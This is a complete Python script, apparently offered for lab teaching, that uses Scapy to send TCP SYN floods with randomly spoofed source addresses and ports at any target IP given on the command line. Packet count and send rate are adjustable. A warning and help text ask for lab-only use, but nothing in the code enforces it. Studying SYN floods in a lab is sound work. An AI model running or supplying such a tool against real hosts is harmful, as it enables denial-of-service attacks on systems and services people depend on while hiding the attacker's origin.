"""
syn_flood_simulation.py
-----------------------
Simulates a TCP SYN flood attack in a **controlled lab environment** for
educational analysis with Wireshark.

WARNING: Run this script only against hosts/networks you own or have explicit
written permission to test.  Sending SYN floods to production systems or
systems you do not own is illegal and unethical.

Requirements
------------
    pip install scapy

Usage
-----
    sudo python3 syn_flood_simulation.py --target 192.168.1.100 --port 80 \
                                          --count 500 --interval 0.01

The script requires root/administrator privileges because it crafts raw
network packets using Scapy.
"""

import argparse
import random
import sys
import time

try:
    from scapy.all import IP, TCP, send
except ImportError:
    print("[ERROR] Scapy is not installed. Run:  pip install scapy")
    sys.exit(1)


def parse_args():
    parser = argparse.ArgumentParser(
        description="TCP SYN flood simulator for educational lab use."
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target IP address (lab VM / loopback only)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=80,
        help="Destination TCP port (default: 80)",
    )
    parser.add_argument(
        "--count",
        type=int,
        default=100,
        help="Number of SYN packets to send (default: 100)",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=0.01,
        help="Delay in seconds between packets (default: 0.01)",
    )
    return parser.parse_args()


def random_ip():
    """Return a random spoofed source IP address."""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def random_port():
    """Return a random ephemeral source port."""
    return random.randint(1024, 65535)


def syn_flood(target: str, port: int, count: int, interval: float) -> None:
    """Send *count* TCP SYN packets with randomized source IP/port."""
    print(f"[*] Starting SYN flood simulation")
    print(f"    Target  : {target}:{port}")
    print(f"    Packets : {count}")
    print(f"    Interval: {interval}s")
    print(f"    (Press Ctrl+C to stop early)\n")

    sent = 0
    try:
        for i in range(count):
            src_ip = random_ip()
            src_port = random_port()

            # Build a raw IP/TCP SYN packet
            packet = IP(src=src_ip, dst=target) / TCP(
                sport=src_port,
                dport=port,
                flags="S",          # SYN flag only
                seq=random.randint(0, 2**32 - 1),
            )

            # verbose=0 suppresses per-packet Scapy output
            send(packet, verbose=0)
            sent += 1

            if (i + 1) % 50 == 0:
                print(f"    Sent {sent}/{count} packets...")

            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except PermissionError:
        print("[ERROR] Root privileges required to send raw packets.")
        print("        Re-run with:  sudo python3 syn_flood_simulation.py ...")
        sys.exit(1)

    print(f"\n[+] SYN flood simulation complete. {sent} packet(s) sent.")
    print("[*] Open Wireshark and apply filter:  tcp.flags.syn == 1 && tcp.flags.ack == 0")


def main():
    args = parse_args()
    syn_flood(
        target=args.target,
        port=args.port,
        count=args.count,
        interval=args.interval,
    )


if __name__ == "__main__":
    main()
